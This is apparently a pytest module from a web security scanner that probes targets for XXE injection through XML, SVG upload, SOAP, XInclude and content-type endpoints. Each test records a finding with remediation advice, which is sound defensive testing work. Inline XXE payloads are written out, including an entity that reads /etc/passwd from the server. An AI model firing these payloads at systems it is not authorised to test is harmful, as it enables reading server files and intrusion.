"""
XML External Entity (XXE) Injection Tests

Tests for XXE vulnerabilities including:
- Classic file read XXE
- Blind XXE detection
- SVG-based XXE
- SOAP XXE
- XInclude attacks
"""

import pytest
from urllib.parse import urljoin

from utils.scanner import SecurityScanner, Finding, Severity
from payloads.xxe import (
    XXE_FILE_READ_PAYLOADS,
    XXE_PARAMETER_ENTITY_PAYLOADS,
    XXE_BLIND_PAYLOADS,
    XINCLUDE_PAYLOADS,
    XXE_SVG_PAYLOADS,
    XXE_SOAP_PAYLOADS,
    XML_ENDPOINTS,
    XML_CONTENT_TYPES,
)


@pytest.fixture
def xxe_scanner(test_config):
    """Create scanner for XXE tests."""
    return SecurityScanner(test_config)


class TestXXEVulnerabilities:
    """XXE Injection test suite."""

    def _find_xml_endpoints(self, scanner, target_url) -> list:
        """Find potential XML endpoints."""
        found_endpoints = []

        for endpoint in XML_ENDPOINTS[:20]:  # Limit to prevent excessive requests
            url = urljoin(target_url.rstrip('/') + '/', endpoint.lstrip('/'))
            resp = scanner.request("OPTIONS", url)

            if resp and resp.status_code != 404:
                found_endpoints.append(url)

        # Also check main URL
        found_endpoints.append(target_url)

        return found_endpoints

    @pytest.mark.security
    @pytest.mark.xxe
    @pytest.mark.xxe_file_read
    def test_xxe_file_read(self, xxe_scanner, target_url, findings_collector):
        """Test for classic XXE file read vulnerabilities."""
        endpoints = self._find_xml_endpoints(xxe_scanner, target_url)

        for endpoint in endpoints[:10]:  # Limit endpoints
            for content_type in XML_CONTENT_TYPES[:3]:  # Test main XML content types
                for payload_info in XXE_FILE_READ_PAYLOADS[:3]:  # Test first 3 payloads
                    payload = payload_info["payload"]
                    check = payload_info["check"]
                    description = payload_info["description"]

                    headers = {"Content-Type": content_type}
                    resp = xxe_scanner.request("POST", endpoint, data=payload, headers=headers)

                    if resp and check in resp.text:
                        finding = Finding(
                            title=f"XXE File Read Vulnerability ({description})",
                            severity=Severity.CRITICAL,
                            description=f"The application is vulnerable to XML External Entity injection. Successful file read detected: {payload_info['target_file']}",
                            url=endpoint,
                            evidence=f"Payload triggered file read, found: {check}",
                            remediation="Disable external entity processing in XML parsers. For Python: use defusedxml. For Java: setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true). For PHP: libxml_disable_entity_loader(true).",
                            cwe_id="CWE-611",
                            owasp_category="A03:2021 - Injection",
                        )
                        findings_collector.add(finding)
                        xxe_scanner.add_finding(finding)
                        return

    @pytest.mark.security
    @pytest.mark.xxe
    @pytest.mark.xxe_parameter_entity
    def test_xxe_parameter_entity(self, xxe_scanner, target_url, findings_collector):
        """Test for parameter entity XXE vulnerabilities."""
        endpoints = self._find_xml_endpoints(xxe_scanner, target_url)

        for endpoint in endpoints[:5]:
            for payload_info in XXE_PARAMETER_ENTITY_PAYLOADS:
                payload = payload_info["payload"]
                check = payload_info.get("check", "")

                headers = {"Content-Type": "application/xml"}
                resp = xxe_scanner.request("POST", endpoint, data=payload, headers=headers)

                if resp:
                    # Check for successful file read
                    if check and check in resp.text:
                        finding = Finding(
                            title="XXE Parameter Entity Injection",
                            severity=Severity.CRITICAL,
                            description=f"Parameter entity XXE detected. {payload_info['description']}",
                            url=endpoint,
                            evidence=f"Parameter entity payload executed successfully",
                            remediation="Disable parameter entity processing. Configure XML parser to disallow DTDs entirely.",
                            cwe_id="CWE-611",
                            owasp_category="A03:2021 - Injection",
                        )
                        findings_collector.add(finding)
                        xxe_scanner.add_finding(finding)
                        return

    @pytest.mark.security
    @pytest.mark.xxe
    @pytest.mark.xxe_blind
    def test_xxe_blind_detection(self, xxe_scanner, target_url, findings_collector):
        """Test for blind XXE via response timing/behavior."""
        endpoints = self._find_xml_endpoints(xxe_scanner, target_url)

        # Test with non-existent entity to detect parsing
        detection_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///nonexistent_file_xxe_test_12345">
]>
<root>&xxe;</root>"""

        # Also test with a payload that might cause noticeable delay
        delay_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:1/">
]>
<root>&xxe;</root>"""

        for endpoint in endpoints[:5]:
            headers = {"Content-Type": "application/xml"}

            # Send benign request first
            benign_resp = xxe_scanner.request("POST", endpoint, data="<root>test</root>", headers=headers)

            if not benign_resp:
                continue

            # Send detection payload
            resp = xxe_scanner.request("POST", endpoint, data=detection_payload, headers=headers)

            if resp:
                # Check for error messages indicating XXE parsing
                xxe_indicators = [
                    "file not found",
                    "no such file",
                    "cannot open",
                    "failed to load external entity",
                    "entity",
                    "DOCTYPE",
                    "DTD",
                    "xml parsing error",
                    "nonexistent_file_xxe_test",
                ]

                for indicator in xxe_indicators:
                    if indicator.lower() in resp.text.lower():
                        finding = Finding(
                            title="Potential Blind XXE (Error-Based Detection)",
                            severity=Severity.MEDIUM,
                            description="The XML parser appears to process external entities. Error message suggests DTD/entity processing is enabled.",
                            url=endpoint,
                            evidence=f"Error indicator found: {indicator}",
                            remediation="Disable external entity and DTD processing even if file read isn't directly exploitable.",
                            cwe_id="CWE-611",
                            owasp_category="A03:2021 - Injection",
                        )
                        findings_collector.add(finding)
                        xxe_scanner.add_finding(finding)
                        return

    @pytest.mark.security
    @pytest.mark.xxe
    @pytest.mark.xxe_svg
    def test_xxe_svg(self, xxe_scanner, target_url, findings_collector):
        """Test for XXE via SVG file uploads/processing."""
        # Look for upload endpoints
        upload_endpoints = [
            urljoin(target_url, "/upload"),
            urljoin(target_url, "/api/upload"),
            urljoin(target_url, "/api/image"),
            urljoin(target_url, "/api/avatar"),
            urljoin(target_url, "/media/upload"),
        ]

        for endpoint in upload_endpoints:
            for payload_info in XXE_SVG_PAYLOADS:
                payload = payload_info["payload"]
                check = payload_info.get("check", "")
                content_type = payload_info.get("content_type", "image/svg+xml")

                # Try direct POST
                headers = {"Content-Type": content_type}
                resp = xxe_scanner.request("POST", endpoint, data=payload, headers=headers)

                if resp and resp.status_code in [200, 201]:
                    if check and check in resp.text:
                        finding = Finding(
                            title="XXE via SVG Upload",
                            severity=Severity.CRITICAL,
                            description="SVG file processing is vulnerable to XXE. Malicious SVG files can read server files.",
                            url=endpoint,
                            evidence=f"SVG XXE payload executed: {payload_info['description']}",
                            remediation="Sanitize SVG files before processing. Use a safe SVG library that strips DOCTYPE and entity declarations. Consider converting SVGs to raster images.",
                            cwe_id="CWE-611",
                            owasp_category="A03:2021 - Injection",
                        )
                        findings_collector.add(finding)
                        xxe_scanner.add_finding(finding)
                        return

    @pytest.mark.security
    @pytest.mark.xxe
    @pytest.mark.xxe_soap
    def test_xxe_soap(self, xxe_scanner, target_url, findings_collector):
        """Test for XXE in SOAP endpoints."""
        soap_endpoints = [
            urljoin(target_url, "/soap"),
            urljoin(target_url, "/ws"),
            urljoin(target_url, "/wsdl"),
            urljoin(target_url, "/api/soap"),
            urljoin(target_url, "/services"),
        ]

        for endpoint in soap_endpoints:
            for payload_info in XXE_SOAP_PAYLOADS:
                payload = payload_info["payload"]
                check = payload_info.get("check", "")
                content_type = payload_info.get("content_type", "text/xml")

                headers = {
                    "Content-Type": content_type,
                    "SOAPAction": '""',
                }
                resp = xxe_scanner.request("POST", endpoint, data=payload, headers=headers)

                if resp and check and check in resp.text:
                    finding = Finding(
                        title="XXE in SOAP Endpoint",
                        severity=Severity.CRITICAL,
                        description="SOAP web service is vulnerable to XXE injection.",
                        url=endpoint,
                        evidence=f"SOAP XXE payload executed successfully",
                        remediation="Configure SOAP library to disable external entities. For Axis2: setFeature. For CXF: configure XMLInputFactory.",
                        cwe_id="CWE-611",
                        owasp_category="A03:2021 - Injection",
                    )
                    findings_collector.add(finding)
                    xxe_scanner.add_finding(finding)
                    return

    @pytest.mark.security
    @pytest.mark.xxe
    @pytest.mark.xinclude
    def test_xinclude_injection(self, xxe_scanner, target_url, findings_collector):
        """Test for XInclude injection (when DOCTYPE is not controllable)."""
        endpoints = self._find_xml_endpoints(xxe_scanner, target_url)

        for endpoint in endpoints[:5]:
            for payload_info in XINCLUDE_PAYLOADS:
                payload = payload_info["payload"]
                check = payload_info.get("check", "")

                headers = {"Content-Type": "application/xml"}
                resp = xxe_scanner.request("POST", endpoint, data=payload, headers=headers)

                if resp and check and check in resp.text:
                    finding = Finding(
                        title="XInclude Injection",
                        severity=Severity.HIGH,
                        description="Application processes XInclude directives, allowing file inclusion even without DOCTYPE control.",
                        url=endpoint,
                        evidence=f"XInclude payload executed: {payload_info['description']}",
                        remediation="Disable XInclude processing in XML parser configuration.",
                        cwe_id="CWE-611",
                        owasp_category="A03:2021 - Injection",
                    )
                    findings_collector.add(finding)
                    xxe_scanner.add_finding(finding)
                    return

    @pytest.mark.security
    @pytest.mark.xxe
    @pytest.mark.xxe_content_type
    def test_xxe_content_type_manipulation(self, xxe_scanner, target_url, findings_collector):
        """Test if changing Content-Type to XML triggers XXE processing."""
        # Try to find JSON endpoints and send XML instead
        json_endpoints = [
            urljoin(target_url, "/api"),
            urljoin(target_url, "/api/data"),
            urljoin(target_url, "/api/submit"),
            target_url,
        ]

        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"""

        for endpoint in json_endpoints:
            # First check if endpoint accepts JSON
            json_resp = xxe_scanner.request(
                "POST",
                endpoint,
                json={"test": "data"},
                headers={"Content-Type": "application/json"}
            )

            if json_resp and json_resp.status_code in [200, 201, 400, 422]:
                # Now try XML with same endpoint
                for ct in ["application/xml", "text/xml"]:
                    xml_resp = xxe_scanner.request(
                        "POST",
                        endpoint,
                        data=xxe_payload,
                        headers={"Content-Type": ct}
                    )

                    if xml_resp and "root:" in xml_resp.text:
                        finding = Finding(
                            title="XXE via Content-Type Manipulation",
                            severity=Severity.CRITICAL,
                            description="Endpoint accepts XML when Content-Type is changed, and is vulnerable to XXE.",
                            url=endpoint,
                            evidence=f"Sent XML to JSON endpoint with Content-Type: {ct}, XXE executed",
                            remediation="Strictly validate Content-Type. Reject unexpected content types. Disable XML entity processing.",
                            cwe_id="CWE-611",
                            owasp_category="A03:2021 - Injection",
                        )
                        findings_collector.add(finding)
                        xxe_scanner.add_finding(finding)
                        return
